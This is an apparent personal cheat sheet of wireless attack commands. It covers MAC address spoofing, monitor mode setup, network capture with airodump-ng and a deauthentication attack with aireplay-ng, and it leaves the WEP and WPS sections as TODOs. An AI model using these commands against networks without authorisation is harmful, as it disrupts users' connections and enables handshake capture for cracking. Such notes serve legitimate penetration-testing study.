# Configuration
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55 - change MAC address
airmon-ng check kill - Monitor mode only needed in pre-connection attacks, no internet connection needed
iwconfig wlan0 mode monitor/managed
ifconfig wlan0 up

# Monitoring networks
airodump-ng wlan0
airodump-ng --bssid {BSSID} --channel {CHANNEL} --write {FILE} wlan0

# Deauth attack
Change wlan0 MAC to CLient BSSID MAC
aireplay-ng --deauth {NUM_PACKETS} -a {ROUTER_BSSID} -c {CLIENT_BSSID} wlan0

# WEP 
TODO

# WPA/WPA2 with WPS
TODO

# WPA/WPA2 
## Receive handshake
= Network monitoring + deauth attack
